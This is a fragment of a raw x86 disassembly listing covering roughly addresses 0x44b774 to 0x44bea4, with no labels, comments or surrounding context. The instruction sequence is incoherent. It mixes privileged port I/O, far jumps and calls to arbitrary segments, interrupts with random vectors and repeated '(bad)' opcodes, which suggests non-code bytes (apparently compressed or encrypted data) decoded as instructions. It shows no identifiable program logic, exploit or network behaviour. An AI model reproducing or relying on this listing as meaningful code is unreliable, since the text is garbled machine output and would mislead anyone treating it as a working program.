  44b774:	mov    bh,BYTE PTR [ecx]
  44b776:	mov    bl,0xee
  44b778:	cmc    
  44b779:	add    al,0xd7
  44b77b:	fldcw  WORD PTR [edx]
  44b77d:	popf   
  44b77e:	outs   dx,DWORD PTR ds:[esi]
  44b77f:	sub    DWORD PTR [ecx+0x206a856a],edx
  44b785:	add    bl,BYTE PTR [eax]
  44b787:	fist   WORD PTR [edx-0x2cd53e1]
  44b78d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b78e:	aaa    
  44b78f:	inc    esi
  44b790:	add    BYTE PTR ds:0x92de971e,ah
  44b796:	jo     0x44b7e4
  44b798:	fdivp  st(4),st
  44b79a:	mov    BYTE PTR ds:0xa5b41409,ch
  44b7a0:	xor    eax,0xe22e70ce
  44b7a5:	in     al,0x41
  44b7a7:	retf   
  44b7a8:	cs dec esi
  44b7aa:	shr    DWORD PTR [ecx+0xd],0xd7
  44b7ae:	jge    0x44b819
  44b7b0:	daa    
  44b7b1:	test   DWORD PTR [ecx],ebp
  44b7b3:	mov    ah,0x3a
  44b7b5:	es pop esp
  44b7b7:	and    al,0x30
  44b7b9:	fisub  DWORD PTR [eax]
  44b7bb:	lods   eax,DWORD PTR ds:[esi]
  44b7bc:	lds    edi,FWORD PTR [edx+0x4b812cad]
  44b7c2:	inc    ebx
  44b7c3:	and    ebp,edx
  44b7c5:	push   esi
  44b7c6:	aaa    
  44b7c7:	lahf   
  44b7c8:	ins    DWORD PTR es:[edi],dx
  44b7c9:	mov    ah,0xa1
  44b7cb:	push   eax
  44b7cc:	jno    0x44b7f9
  44b7ce:	aaa    
  44b7cf:	mov    dh,0x39
  44b7d1:	add    bh,dl
  44b7d3:	xchg   edx,eax
  44b7d4:	pop    ebp
  44b7d5:	dec    ecx
  44b7d6:	adc    BYTE PTR [edx+0x7780fe1a],dl
  44b7dc:	push   ebp
  44b7dd:	sbb    bh,BYTE PTR [eax+0x2ce31bb3]
  44b7e3:	mov    ch,0xa0
  44b7e5:	fcmove st,st(6)
  44b7e7:	push   ebx
  44b7e8:	jns    0x44b847
  44b7ea:	call   0xfc2c2c44
  44b7ef:	retf   0x4db3
  44b7f2:	(bad)  
  44b7f3:	sti    
  44b7f4:	pop    esi
  44b7f5:	das    
  44b7f6:	xor    BYTE PTR [edx+0x7213e9a6],0x4b
  44b7fd:	gs mov bl,0x8e
  44b800:	mov    ebp,0x270b8d19
  44b805:	sbb    esi,DWORD PTR [edi-0x6c3cee4d]
  44b80b:	nop
  44b80c:	xor    bl,BYTE PTR [esi+0x254f6a20]
  44b812:	shl    eax,0x16
  44b815:	popa   
  44b816:	es ins DWORD PTR es:[edi],dx
  44b818:	pop    ds
  44b819:	adc    ebx,DWORD PTR [edi-0x32]
  44b81c:	sub    BYTE PTR [eax],cl
  44b81e:	adc    ebx,DWORD PTR [edi+ebx*4-0x70972d57]
  44b825:	nop
  44b826:	loop   0x44b83d
  44b828:	xchg   esi,eax
  44b829:	or     eax,0xffffffe9
  44b82c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b82d:	arpl   WORD PTR [edx-0x3c5ac642],bp
  44b833:	push   ds
  44b834:	je     0x44b852
  44b836:	pop    esp
  44b837:	sbb    cl,BYTE PTR [esi]
  44b839:	jnp    0x44b860
  44b83b:	dec    esi
  44b83c:	in     eax,0xd8
  44b83e:	xor    DWORD PTR [edi],edi
  44b840:	push   cs
  44b841:	and    ch,BYTE PTR [ecx+eiz*2-0x7f]
  44b845:	ret    0xeec
  44b848:	ss pop ss
  44b84a:	test   BYTE PTR [edx+0x106c8dad],0x7d
  44b851:	add    dl,BYTE PTR [ebp+0x54]
  44b854:	sti    
  44b855:	inc    ecx
  44b856:	sbb    DWORD PTR [ebx+edi*4],esp
  44b859:	mov    edi,0x1477e0b8
  44b85e:	outs   dx,DWORD PTR ds:[esi]
  44b85f:	inc    esp
  44b860:	xor    al,0xef
  44b862:	scas   eax,DWORD PTR es:[edi]
  44b863:	sbb    al,0x9a
  44b865:	and    dl,0xf4
  44b868:	mov    eax,0xafb9b5a8
  44b86d:	jp     0x44b8b0
  44b86f:	call   0xce58d21a
  44b874:	fcmovne st,st(7)
  44b876:	pop    ss
  44b877:	inc    eax
  44b878:	mov    ah,0xbe
  44b87a:	adc    bh,BYTE PTR [edi+0x47]
  44b87d:	adc    DWORD PTR [ebx-0x11],0xffffffca
  44b881:	cmp    bh,BYTE PTR [ebp-0x9]
  44b884:	mov    bh,0xa5
  44b886:	daa    
  44b887:	sub    al,0xef
  44b889:	push   esp
  44b88a:	popf   
  44b88b:	in     al,0xdc
  44b88d:	aad    0xe3
  44b88f:	pop    es
  44b890:	dec    edx
  44b891:	test   edi,edi
  44b893:	push   ebx
  44b894:	aaa    
  44b895:	inc    edx
  44b896:	repz repz cmp al,0x56
  44b89a:	cmp    DWORD PTR [edx+edi*1+0x23b48ff8],eax
  44b8a1:	leave  
  44b8a2:	or     bl,ah
  44b8a4:	xor    al,0xff
  44b8a6:	retf   
  44b8a7:	aaa    
  44b8a8:	repz pop edx
  44b8aa:	pop    eax
  44b8ab:	icebp  
  44b8ac:	les    esp,FWORD PTR [eax+eiz*1+0x6a]
  44b8b0:	push   edi
  44b8b1:	push   esi
  44b8b2:	inc    edi
  44b8b3:	and    DWORD PTR [edx],edx
  44b8b5:	mov    ds,esp
  44b8b7:	es (bad) 
  44b8b9:	imul   esi,DWORD PTR [ebx+0x5949805b],0xffffff8e
  44b8c0:	push   edx
  44b8c1:	and    ah,BYTE PTR [ecx-0x16]
  44b8c4:	ror    BYTE PTR [ebx+esi*1],cl
  44b8c7:	ret    
  44b8c8:	loop   0x44b86b
  44b8ca:	mov    ebp,DWORD PTR [eax+0x7dca460d]
  44b8d0:	adc    eax,0xc57301ba
  44b8d5:	in     eax,dx
  44b8d6:	pop    edx
  44b8d7:	and    ecx,eax
  44b8d9:	hlt    
  44b8da:	imul   ecx,DWORD PTR [eax+0xe23a51d],0xffffffb9
  44b8e1:	int    0x47
  44b8e3:	out    dx,al
  44b8e4:	and    DWORD PTR [edx+0x74],edx
  44b8e7:	mov    dl,0xc4
  44b8e9:	(bad)  
  44b8eb:	mov    ecx,0x765a52ce
  44b8f0:	test   al,0xdc
  44b8f2:	cmp    eax,edx
  44b8f4:	aad    0xe4
  44b8f6:	sbb    al,0xf5
  44b8f8:	inc    ebx
  44b8f9:	and    BYTE PTR [ecx],bh
  44b8fb:	add    DWORD PTR [ebx+ebp*2],ebp
  44b8fe:	cmp    DWORD PTR [si-0x2fd],ebp
  44b903:	mov    ecx,ebx
  44b905:	sbb    edx,edx
  44b907:	mov    esi,0x830fce6f
  44b90c:	pop    esp
  44b90d:	sti    
  44b90e:	lods   al,BYTE PTR ds:[esi]
  44b90f:	sbb    al,BYTE PTR [eax]
  44b911:	cdq    
  44b912:	dec    ecx
  44b913:	pop    ss
  44b914:	or     DWORD PTR [edx-0x4145a685],0xd79f15ab
  44b91e:	sar    eax,0x9e
  44b921:	mov    al,0x2f
  44b923:	sbb    DWORD PTR [esi+0x3f],0x3c1e5e88
  44b92a:	cmc    
  44b92b:	sbb    DWORD PTR [edx],esp
  44b92d:	test   BYTE PTR [ebp+0x4d43e1fb],bh
  44b933:	in     al,dx
  44b934:	out    dx,eax
  44b935:	xor    edx,edi
  44b937:	mov    eax,0xf016700
  44b93c:	inc    esi
  44b93d:	or     eax,0x35209cd1
  44b942:	add    eax,0xff094b4e
  44b947:	inc    esp
  44b948:	adc    al,al
  44b94a:	popa   
  44b94b:	jmp    0x44b92c
  44b94d:	jo     0x44b936
  44b94f:	xor    BYTE PTR [esi],ch
  44b951:	popa   
  44b952:	mov    WORD PTR [eax-0x2c],cs
  44b955:	out    dx,al
  44b956:	cmp    ah,bh
  44b958:	inc    eax
  44b959:	sub    DWORD PTR [ebp+0x132bf265],edx
  44b95f:	jmp    0x68d1:0x76feb49c
  44b966:	pop    esi
  44b967:	inc    esi
  44b968:	jae    0x44b9d7
  44b96a:	mov    esp,0xdd660431
  44b96f:	push   es
  44b970:	inc    ebp
  44b971:	mov    ecx,0xbf8240cf
  44b976:	xor    BYTE PTR [esi+eax*4+0x8],cl
  44b97a:	xor    eax,0xcf12ad36
  44b97f:	call   FWORD PTR [ecx]
  44b981:	adc    edi,DWORD PTR [esi]
  44b983:	push   ebx
  44b984:	lods   eax,DWORD PTR ds:[esi]
  44b985:	dec    eax
  44b986:	adc    dl,ah
  44b988:	test   eax,0x97a8e3a4
  44b98d:	mov    ebp,0x1e2f36ef
  44b992:	sub    eax,0xa1a97fbe
  44b997:	aam    0xe1
  44b999:	xchg   BYTE PTR [ebp-0xa],cl
  44b99c:	sub    BYTE PTR [eax-0x1],al
  44b99f:	or     eax,0x6a63f306
  44b9a4:	mov    ds,WORD PTR [ebp-0x24bb720d]
  44b9aa:	cmc    
  44b9ab:	ja     0x44b9f3
  44b9ad:	cmp    BYTE PTR [esi-0x60129dd3],al
  44b9b3:	cwde   
  44b9b4:	stos   DWORD PTR es:[edi],eax
  44b9b5:	ror    BYTE PTR [eax-0x166c9532],1
  44b9bb:	push   ebp
  44b9bc:	loop   0x44ba0f
  44b9be:	dec    ebp
  44b9bf:	js     0x44b944
  44b9c1:	xor    esp,edx
  44b9c3:	jmp    0xc39a:0x41d75950
  44b9ca:	cld    
  44b9cb:	cli    
  44b9cc:	sub    DWORD PTR [edi],ebx
  44b9ce:	xchg   BYTE PTR [esi-0xc],dh
  44b9d1:	ds jmp 0x44b97a
  44b9d4:	xor    al,0x24
  44b9d6:	mov    ah,0x3d
  44b9d8:	sub    al,0x57
  44b9da:	mov    ah,cl
  44b9dc:	xchg   ecx,eax
  44b9dd:	gs xor eax,0x12cd5e59
  44b9e3:	sub    BYTE PTR [esi-0x62],ah
  44b9e6:	inc    esi
  44b9e7:	jle    0x44ba27
  44b9e9:	int    0x86
  44b9eb:	inc    ebx
  44b9ec:	(bad)  
  44b9ed:	out    dx,al
  44b9ee:	and    eax,0x3a02bf86
  44b9f3:	pop    esp
  44b9f4:	or     ch,BYTE PTR [esi-0x47dad434]
  44b9fa:	mov    dh,0xd2
  44b9fc:	add    cl,bl
  44b9fe:	dec    esi
  44b9ff:	xchg   ebp,eax
  44ba00:	(bad)  
  44ba01:	in     al,dx
  44ba02:	mov    edx,0x280abbe
  44ba07:	cli    
  44ba08:	inc    eax
  44ba09:	adc    BYTE PTR [ebx],bl
  44ba0b:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ba0d:	xor    BYTE PTR gs:[ecx],cl
  44ba10:	pcmpgtw mm6,QWORD PTR [esi+esi*1+0x69]
  44ba15:	test   al,0xa0
  44ba17:	inc    esi
  44ba18:	jle    0x44b9a6
  44ba1a:	lods   eax,DWORD PTR ds:[esi]
  44ba1b:	jmp    0x44b9ba
  44ba1d:	dec    edx
  44ba1e:	fs (bad) 
  44ba20:	ins    BYTE PTR es:[edi],dx
  44ba21:	sbb    BYTE PTR [eax-0x63],0x2d
  44ba25:	(bad)  
  44ba26:	mov    ds:0x2b7b7fcd,eax
  44ba2b:	loop   0x44ba2c
  44ba2d:	lock sbb esi,DWORD PTR [ebx+edi*8]
  44ba31:	sub    BYTE PTR [edi],dl
  44ba33:	cmp    ecx,DWORD PTR [edi-0x6d61029a]
  44ba39:	jecxz  0x44ba1c
  44ba3b:	in     al,dx
  44ba3c:	scas   al,BYTE PTR es:[edi]
  44ba3d:	push   edx
  44ba3e:	(bad)  
  44ba3f:	aam    0x6f
  44ba41:	ret    
  44ba42:	jmp    0xea70:0xc1a0a6bb
  44ba49:	hlt    
  44ba4a:	mov    edx,edx
  44ba4c:	clc    
  44ba4d:	adc    eax,0x347f327
  44ba52:	pop    ecx
  44ba53:	jle    0x44ba82
  44ba55:	repz lea eax,[ebp+0x25]
  44ba59:	icebp  
  44ba5a:	adc    esi,ecx
  44ba5c:	mov    ds:0x8c78ff31,eax
  44ba61:	pop    esp
  44ba62:	mov    esi,0x10c584fc
  44ba67:	(bad)  
  44ba68:	fdiv   DWORD PTR [esp+ebp*1+0x2c]
  44ba6c:	shl    DWORD PTR [ecx],cl
  44ba6e:	push   esp
  44ba6f:	dec    ebx
  44ba70:	imul   ebx,eax,0x49798bfa
  44ba76:	xor    eax,0xb902b551
  44ba7b:	lods   al,BYTE PTR ds:[esi]
  44ba7c:	outs   dx,BYTE PTR ds:[esi]
  44ba7d:	dec    edx
  44ba7e:	and    eax,0x64661b10
  44ba83:	mov    edx,0xa413755c
  44ba88:	dec    ebp
  44ba89:	in     al,dx
  44ba8a:	stc    
  44ba8b:	xchg   esi,eax
  44ba8c:	mov    dh,0x16
  44ba8e:	out    dx,eax
  44ba8f:	jge    0x44ba39
  44ba91:	push   ebx
  44ba92:	(bad)  
  44ba94:	or     eax,0xee2a6ac5
  44ba99:	cmp    ch,BYTE PTR [eax]
  44ba9b:	or     BYTE PTR es:[eax],0x95
  44ba9f:	sahf   
  44baa0:	ins    BYTE PTR es:[edi],dx
  44baa1:	loopne 0x44ba90
  44baa3:	js     0x44baf7
  44baa5:	xor    al,0xed
  44baa7:	imul   edi,DWORD PTR [ebx+0x14878363],0x28
  44baae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44baaf:	xchg   ebp,eax
  44bab0:	inc    edx
  44bab1:	or     al,ah
  44bab3:	retf   
  44bab4:	pop    esp
  44bab5:	xchg   esp,eax
  44bab6:	and    DWORD PTR [ebp+0x74],edx
  44bab9:	mov    esi,0x6b28a466
  44babe:	lahf   
  44babf:	xlat   BYTE PTR ds:[ebx]
  44bac0:	mov    ebp,0x517cc215
  44bac5:	jnp    0x44babf
  44bac7:	pop    esi
  44bac8:	pushf  
  44bac9:	into   
  44baca:	ins    BYTE PTR es:[edi],dx
  44bacb:	ins    BYTE PTR es:[edi],dx
  44bacc:	pop    ds
  44bacd:	xchg   ebx,eax
  44bace:	fistp  WORD PTR [esi+0x31ffd17c]
  44bad4:	jne    0x44bac3
  44bad6:	dec    ebx
  44bad7:	retf   0x9984
  44bada:	mov    ch,0xe3
  44badc:	test   DWORD PTR [edx-0x2d],0x73affadc
  44bae3:	fld    DWORD PTR [edx+0x4d]
  44bae6:	xlat   BYTE PTR ds:[ebx]
  44bae7:	sub    cl,BYTE PTR [ecx]
  44bae9:	cmp    BYTE PTR [edx+0x5],bl
  44baec:	inc    esp
  44baed:	int3   
  44baee:	mov    ah,0x49
  44baf0:	mov    eax,ds:0x8b4c72
  44baf5:	xchg   edx,eax
  44baf6:	into   
  44baf7:	pop    ss
  44baf8:	int    0xae
  44bafa:	fwait
  44bafb:	inc    edx
  44bafc:	xchg   DWORD PTR [edi+edi*2+0x4c],edx
  44bb00:	and    edx,eax
  44bb02:	pop    es
  44bb03:	aas    
  44bb04:	jb     0x44bb23
  44bb06:	ja     0x44badc
  44bb08:	sar    ah,1
  44bb0a:	cmp    esi,ebp
  44bb0c:	xchg   edx,eax
  44bb0d:	lods   eax,DWORD PTR ds:[esi]
  44bb0e:	pop    edx
  44bb0f:	rcl    DWORD PTR [ebx+0x75a7fb4e],cl
  44bb15:	add    ebp,0xfffffffc
  44bb18:	into   
  44bb19:	(bad)  
  44bb1a:	mov    cl,0xdd
  44bb1c:	dec    ebp
  44bb1d:	sbb    eax,0x103d26b8
  44bb22:	sub    al,0x92
  44bb24:	sbb    ch,BYTE PTR [edx]
  44bb26:	sub    BYTE PTR [ebp+0x71],ah
  44bb29:	or     al,0x6a
  44bb2b:	sahf   
  44bb2c:	ins    BYTE PTR es:[edi],dx
  44bb2d:	mov    BYTE PTR [edx],cl
  44bb2f:	adc    cl,BYTE PTR [eax+ebx*2-0x6d41c0c]
  44bb36:	addr16 pop eax
  44bb38:	neg    DWORD PTR [eax-0x45]
  44bb3b:	(bad)  
  44bb3c:	ins    BYTE PTR es:[edi],dx
  44bb3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44bb3e:	loope  0x44bb35
  44bb40:	push   esp
  44bb41:	xor    al,0x34
  44bb43:	fiadd  WORD PTR gs:[ecx+0xe]
  44bb47:	mov    edi,0x5a92bb9d
  44bb4c:	aaa    
  44bb4d:	lahf   
  44bb4e:	dec    ecx
  44bb4f:	mov    eax,ebx
  44bb51:	(bad)  [ecx-0x9]
  44bb54:	pop    es
  44bb55:	sbb    dh,dl
  44bb57:	or     al,0xc0
  44bb59:	faddp  st(1),st
  44bb5b:	inc    eax
  44bb5c:	mov    ah,0x28
  44bb5e:	jno    0x44bb11
  44bb60:	xor    DWORD PTR [esi],esi
  44bb62:	mov    bh,0x95
  44bb64:	xor    al,0x92
  44bb66:	imul   ebx,DWORD PTR [esi-0x212affbc],0xffffff87
  44bb6d:	jp     0x44bbce
  44bb6f:	outs   dx,BYTE PTR ds:[esi]
  44bb70:	or     eax,0x2371d28d
  44bb75:	pop    ebp
  44bb76:	inc    edi
  44bb77:	or     DWORD PTR [eax-0x60],edx
  44bb7a:	push   ecx
  44bb7b:	cld    
  44bb7c:	outs   dx,BYTE PTR ds:[esi]
  44bb7d:	push   eax
  44bb7e:	cmc    
  44bb7f:	sbb    ebx,DWORD PTR [ebp+0x4757f7d0]
  44bb85:	mov    ecx,DWORD PTR [edi+0x2f50ad01]
  44bb8b:	call   0x9be4:0xeb91e80a
  44bb92:	shl    ebx,cl
  44bb94:	hlt    
  44bb95:	xchg   edi,eax
  44bb96:	mov    al,ds:0xfd2655cc
  44bb9b:	jns    0x44bb62
  44bb9d:	outs   dx,DWORD PTR ds:[esi]
  44bb9e:	jae    0x44bbb4
  44bba0:	adc    BYTE PTR [edx-0x7eac18f7],ah
  44bba6:	imul   esp,DWORD PTR [ebx+0x30cb10b],0xffffffb4
  44bbad:	inc    esi
  44bbae:	lods   al,BYTE PTR ds:[esi]
  44bbaf:	or     eax,0xb2ecb494
  44bbb4:	shr    edx,cl
  44bbb6:	lock ins BYTE PTR es:[edi],dx
  44bbb8:	scas   eax,DWORD PTR es:[edi]
  44bbb9:	in     eax,dx
  44bbba:	aas    
  44bbbb:	jmp    0x44bb9d
  44bbbd:	add    DWORD PTR [ecx],ebx
  44bbbf:	mov    DWORD PTR [edi],ebx
  44bbc1:	mov    ecx,0xc51efb2d
  44bbc6:	mov    esp,DWORD PTR [edx]
  44bbc8:	mov    dh,0x48
  44bbca:	jnp    0x44bb53
  44bbcc:	push   0x515fc2ce
  44bbd1:	enter  0x61b4,0xd8
  44bbd5:	repz mov esp,DWORD PTR [edi-0x6c]
  44bbd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44bbda:	and    ah,BYTE PTR [edx-0x79d5ef50]
  44bbe0:	xor    eax,0x5956e2d7
  44bbe5:	loop   0x44bc1b
  44bbe7:	jns    0x44bbf9
  44bbe9:	ret    0xefd4
  44bbec:	mov    esi,0x212df150
  44bbf1:	scas   al,BYTE PTR es:[edi]
  44bbf2:	dec    edx
  44bbf3:	stos   DWORD PTR es:[edi],eax
  44bbf4:	or     DWORD PTR [esi+0x17],0x88d6b75d
  44bbfb:	mov    bh,0xad
  44bbfd:	sub    DWORD PTR [eax+0x5a],edi
  44bc00:	pop    ss
  44bc01:	add    BYTE PTR [ebx],bh
  44bc03:	mov    edx,0x44b30507
  44bc08:	adc    al,0x62
  44bc0a:	add    BYTE PTR [edx],al
  44bc0c:	push   ds
  44bc0d:	in     eax,dx
  44bc0e:	mov    DWORD PTR ds:0x8bf5af7a,ebp
  44bc14:	sub    bh,BYTE PTR fs:[ecx-0x5dde2293]
  44bc1b:	sbb    BYTE PTR [edx+esi*1],ah
  44bc1e:	out    dx,al
  44bc1f:	iret   
  44bc20:	push   0x8550c8c3
  44bc25:	adc    al,0x84
  44bc27:	mov    edx,0x2053e149
  44bc2c:	jo     0x44bc18
  44bc2e:	ret    0x6be3
  44bc31:	retf   0xddf2
  44bc34:	sbb    eax,0xa98583f2
  44bc39:	int    0x20
  44bc3b:	push   esi
  44bc3c:	popf   
  44bc3d:	cld    
  44bc3e:	jmp    0x44bbc1
  44bc40:	add    al,0xb
  44bc42:	enter  0x8ead,0xbb
  44bc46:	(bad)  
  44bc47:	call   0x352f:0x4c71b956
  44bc4e:	ja     0x44bc18
  44bc50:	or     BYTE PTR [esi-0x5],dh
  44bc53:	and    BYTE PTR [edx-0xb],cl
  44bc56:	push   0xffffff97
  44bc58:	jg     0x44bc95
  44bc5a:	and    eax,0x28eb3e55
  44bc5f:	out    0x1a,al
  44bc61:	call   0x5bef:0x13b95002
  44bc68:	pop    esi
  44bc69:	test   BYTE PTR [edi+0x24],bl
  44bc6c:	dec    ebp
  44bc6d:	xchg   ecx,eax
  44bc6e:	jmp    0x44bbf1
  44bc70:	ret    0x923b
  44bc73:	jle    0x44bc58
  44bc75:	dec    ebp
  44bc76:	call   DWORD PTR [eax+ebx*2]
  44bc79:	(bad)  
  44bc7a:	xchg   edx,eax
  44bc7b:	mov    dh,0xbc
  44bc7d:	inc    esp
  44bc7e:	fxch   st(0)
  44bc80:	and    cl,bl
  44bc82:	mov    cl,0xb3
  44bc84:	mov    ds,WORD PTR [ecx-0x3f]
  44bc87:	adc    DWORD PTR [ebx+eiz*1+0x160afffb],ebp
  44bc8e:	mov    esp,DWORD PTR [edi]
  44bc90:	xchg   ecx,eax
  44bc91:	imul   ebx,DWORD PTR [eax+0x9],0xffffff84
  44bc95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44bc96:	or     bl,bl
  44bc98:	clc    
  44bc99:	test   al,ah
  44bc9b:	sbb    edi,DWORD PTR [edi+0x4e]
  44bc9e:	adc    DWORD PTR [esi+0x2bd383ec],edx
  44bca4:	rol    BYTE PTR [esp+eax*1+0x73feae49],cl
  44bcab:	in     al,0xd3
  44bcad:	mov    edx,0x8e4c9710
  44bcb2:	pop    esp
  44bcb3:	xchg   DWORD PTR [edi-0x68dc657],ebx
  44bcb9:	xor    al,0x5e
  44bcbb:	or     ecx,ecx
  44bcbd:	mov    BYTE PTR [ebx-0x2f],0xe6
  44bcc1:	hlt    
  44bcc2:	jnp    0x44bc82
  44bcc4:	out    0x43,eax
  44bcc6:	fcomi  st,st(4)
  44bcc8:	mov    ds:0x7ce1def7,al
  44bccd:	mov    ds:0xea9b7c48,eax
  44bcd2:	rcr    BYTE PTR [ebp-0x4a898f17],0x12
  44bcd9:	mov    ebx,DWORD PTR [esi-0x55]
  44bcdc:	clc    
  44bcdd:	xchg   ebx,eax
  44bcde:	scas   al,BYTE PTR es:[edi]
  44bcdf:	test   al,0xf7
  44bce1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44bce2:	mov    eax,ds:0x71cbefea
  44bce7:	adc    DWORD PTR [edx-0x1d8989a5],ebp
  44bced:	or     DWORD PTR [eax+0x45],0x66
  44bcf1:	mov    es,WORD PTR [ecx-0x56a67985]
  44bcf7:	sti    
  44bcf8:	cli    
  44bcf9:	mov    esp,0x6dc72f26
  44bcfe:	mov    edi,0xfd7d9929
  44bd03:	jmp    0x1fee2bb6
  44bd08:	sub    DWORD PTR [edi+0x42],ecx
  44bd0b:	loop   0x44bcc2
  44bd0d:	test   ebx,ecx
  44bd0f:	mov    eax,ds:0xb027ec3e
  44bd14:	in     al,dx
  44bd15:	fisttp QWORD PTR [ecx+0x1b401920]
  44bd1b:	in     al,0x2e
  44bd1d:	fadd   DWORD PTR [ebx-0x18a2757d]
  44bd23:	cld    
  44bd24:	mov    ch,0x74
  44bd26:	pop    ecx
  44bd27:	arpl   WORD PTR fs:[ebx+0x2c],bp
  44bd2b:	dec    edi
  44bd2c:	inc    ebx
  44bd2d:	mov    cl,0xd8
  44bd2f:	pop    ss
  44bd30:	jno    0x44bcdb
  44bd32:	xor    ah,ch
  44bd34:	adc    dl,BYTE PTR [eax]
  44bd36:	scas   al,BYTE PTR es:[edi]
  44bd37:	(bad)  
  44bd38:	xchg   ecx,eax
  44bd39:	mov    cl,0x46
  44bd3b:	dec    edi
  44bd3c:	in     eax,0x13
  44bd3e:	bound  edx,QWORD PTR [ebp+0x3dd881ab]
  44bd44:	adc    al,0x60
  44bd46:	xchg   ebx,eax
  44bd47:	dec    DWORD PTR ss:[ebx+edx*1]
  44bd4b:	clc    
  44bd4c:	icebp  
  44bd4d:	and    BYTE PTR [esi+0x511375fc],cl
  44bd53:	sub    BYTE PTR [esi],ch
  44bd55:	stc    
  44bd56:	cld    
  44bd57:	js     0x44bd04
  44bd59:	jae    0x44bd16
  44bd5b:	dec    ebx
  44bd5c:	inc    ebp
  44bd5d:	xor    BYTE PTR [eax+0x70725b26],ah
  44bd63:	les    ebp,FWORD PTR [eax]
  44bd65:	(bad)  
  44bd66:	ret    
  44bd67:	imul   edi,DWORD PTR [ecx+0x46],0x3aa41ee
  44bd6e:	adc    BYTE PTR ss:[ebx+0x40],bl
  44bd72:	dec    ebp
  44bd73:	in     al,dx
  44bd74:	push   cs
  44bd75:	ins    BYTE PTR es:[edi],dx
  44bd76:	ins    BYTE PTR es:[edi],dx
  44bd77:	xchg   ecx,eax
  44bd78:	mov    ds,edx
  44bd7a:	add    BYTE PTR [eax-0x87bf167],al
  44bd80:	in     al,dx
  44bd81:	sub    ecx,0xd72421
  44bd87:	adc    cl,ah
  44bd89:	adc    dl,dl
  44bd8b:	xchg   ecx,eax
  44bd8c:	sub    al,0xdf
  44bd8e:	in     al,0x5f
  44bd90:	rol    ebx,1
  44bd92:	test   BYTE PTR [ecx-0x7d],ah
  44bd95:	in     eax,0xf5
  44bd97:	cli    
  44bd98:	mov    bh,0x45
  44bd9a:	stos   BYTE PTR es:[edi],al
  44bd9b:	mov    edi,0x6717b0c7
  44bda0:	je     0x44bd75
  44bda2:	leave  
  44bda3:	push   ebp
  44bda4:	push   edi
  44bda5:	pop    esi
  44bda6:	xchg   ebp,eax
  44bda7:	cmp    DWORD PTR [eax-0x10a80b2],ecx
  44bdad:	push   cs
  44bdae:	stos   DWORD PTR es:[edi],eax
  44bdaf:	mov    DWORD PTR [edi+ecx*8],esp
  44bdb2:	add    al,BYTE PTR [eax-0x3b35b65d]
  44bdb8:	es nop
  44bdba:	adc    al,0x21
  44bdbc:	gs scas al,BYTE PTR es:[edi]
  44bdbe:	popa   
  44bdbf:	mov    ah,0x57
  44bdc1:	outs   dx,BYTE PTR ds:[esi]
  44bdc2:	ret    0x6a5c
  44bdc5:	ror    BYTE PTR [esi+0x28],cl
  44bdc8:	add    ebx,DWORD PTR [esi-0x60]
  44bdcb:	mov    ds:0x11f30c55,al
  44bdd0:	mov    eax,0xbd21d887
  44bdd5:	adc    DWORD PTR [ebx-0x2b7755e1],ebp
  44bddb:	adc    esi,DWORD PTR [edx+edi*2]
  44bdde:	outs   dx,DWORD PTR ds:[esi]
  44bddf:	fcom   QWORD PTR [ecx-0x64]
  44bde2:	inc    esi
  44bde3:	rcl    ebp,cl
  44bde5:	popa   
  44bde6:	fisttp WORD PTR [eax-0x70]
  44bde9:	xlat   BYTE PTR ds:[ebx]
  44bdea:	push   0x3c
  44bdec:	fstp   QWORD PTR [esi+0xf]
  44bdef:	call   0xca0bc3e4
  44bdf4:	imul   esi,DWORD PTR [edx],0x3ae85a16
  44bdfa:	xchg   edi,eax
  44bdfb:	dec    ebx
  44bdfc:	stc    
  44bdfd:	and    al,0x43
  44bdff:	dec    esp
  44be00:	shl    BYTE PTR ds:0x70dc6032,cl
  44be06:	add    esp,DWORD PTR [edx-0x15]
  44be09:	adc    al,0x69
  44be0b:	adc    eax,0x7f66e77
  44be10:	dec    eax
  44be11:	push   eax
  44be12:	mov    ah,0xe5
  44be14:	xchg   ebp,eax
  44be15:	loop   0x44bde5
  44be17:	mov    cl,0xac
  44be19:	loope  0x44bdb9
  44be1b:	and    eax,0x13f6acff
  44be20:	js     0x44be8b
  44be22:	in     eax,dx
  44be23:	or     eax,0x232e9e3f
  44be28:	jne    0x44be4d
  44be2a:	mov    al,ds:0x889b97ec
  44be2f:	dec    ebx
  44be30:	fadd   DWORD PTR [eax]
  44be32:	fidiv  WORD PTR [ecx]
  44be34:	inc    esi
  44be35:	inc    edi
  44be36:	adc    ah,dh
  44be38:	and    dl,BYTE PTR [edx-0x2ed19f42]
  44be3e:	and    esp,DWORD PTR [edx-0x3a]
  44be41:	les    edx,FWORD PTR [eax+eiz*1-0x1d3e0a14]
  44be48:	mov    ds:0x9061e3a5,al
  44be4d:	xchg   ebp,eax
  44be4e:	call   0x3142:0x516ed31
  44be55:	sbb    ch,BYTE PTR [ebx]
  44be57:	add    DWORD PTR [ebp-0x6e665318],ebx
  44be5d:	neg    edi
  44be5f:	dec    ecx
  44be60:	sbb    eax,0x762121e5
  44be65:	sub    al,0x0
  44be67:	mov    ds:0x91da661b,al
  44be6c:	std    
  44be6d:	mov    al,0x83
  44be6f:	aas    
  44be70:	sbb    ecx,DWORD PTR [ebx+0x55]
  44be73:	mov    al,ds:0xe25540f3
  44be78:	pop    eax
  44be79:	retf   0x1a6f
  44be7c:	ret    
  44be7d:	imul   eax,DWORD PTR [edi],0xffffffaf
  44be80:	(bad)  
  44be81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44be82:	retf   0xca6b
  44be85:	lahf   
  44be86:	xchg   ebx,eax
  44be87:	cmp    esi,edi
  44be89:	xor    eax,0x1c2ff0e4
  44be8e:	sbb    BYTE PTR [edi+0x1b36b0a],ch
  44be94:	adc    BYTE PTR [eax],dl
  44be96:	outs   dx,BYTE PTR ds:[esi]
  44be97:	push   ds
  44be98:	retf   0x25e3
  44be9b:	jo     0x44bef4
  44be9d:	xchg   BYTE PTR [ecx+0x41],cl
  44bea0:	xor    ebx,DWORD PTR [edx]
  44bea2:	cmp    bl,BYTE PTR [esi]
  44bea4:	inc    ebp
